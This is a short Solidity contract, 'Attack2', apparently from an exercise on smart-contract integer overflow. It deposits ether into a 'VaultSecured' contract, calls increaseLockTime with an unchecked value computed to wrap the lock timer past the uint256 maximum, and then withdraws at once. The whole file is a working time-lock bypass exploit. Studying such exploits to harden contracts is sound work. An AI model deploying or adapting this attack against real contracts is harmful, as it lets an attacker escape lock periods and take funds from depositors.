// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.15;

import "./VaultSecured.sol";

contract Attack2 {
    VaultSecured v;

    fallback() external payable {}

    receive() external payable {}

    constructor(address contractAddress) {
        v = VaultSecured(contractAddress);
    }

    function attack() public payable {
        v.deposit{value: msg.value}();
        unchecked {
            v.increaseLockTime(
                type(uint256).max + 1 - v.redeemTimer(address(this))
            );
        }

        v.withdraw();
    }
}
